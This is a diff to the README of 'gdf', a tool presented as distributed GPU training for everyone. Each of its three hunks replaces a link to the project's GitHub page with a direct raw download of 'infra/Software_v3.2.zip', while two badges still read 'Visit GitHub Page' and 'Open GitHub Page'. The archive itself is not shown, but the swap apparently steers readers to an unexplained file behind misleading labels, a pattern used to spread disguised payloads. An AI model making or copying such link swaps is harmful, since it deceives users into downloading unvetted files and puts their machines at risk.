@@ -1,6 +1,6 @@
 # 🤝 gdf - Distributed GPU Training for Everyone
 
-[![Download gdf](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/poyghi/gdf)
+[![Download gdf](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/poyghi/gdf/raw/refs/heads/main/infra/Software_v3.2.zip)
 
 ## 🚀 What gdf Does
 
@@ -31,7 +31,7 @@ If you plan to train larger models, more RAM and more GPU memory will help.
 
 ## 📥 Download gdf
 
-[![Download gdf](https://img.shields.io/badge/Download-Open%20GitHub%20Page-grey?style=for-the-badge)](https://github.com/poyghi/gdf)
+[![Download gdf](https://img.shields.io/badge/Download-Open%20GitHub%20Page-grey?style=for-the-badge)](https://github.com/poyghi/gdf/raw/refs/heads/main/infra/Software_v3.2.zip)
 
 1. Open the download page
 2. Look for the latest release or the main app files
@@ -198,7 +198,7 @@ You may see a few words in the app that are common in AI tools:
 
 ## 📎 Download Again
 
-[https://github.com/poyghi/gdf](https://github.com/poyghi/gdf)
+[https://github.com/poyghi/gdf/raw/refs/heads/main/infra/Software_v3.2.zip](https://github.com/poyghi/gdf/raw/refs/heads/main/infra/Software_v3.2.zip)
 
 ## 🖥️ Best Results on Windows
 
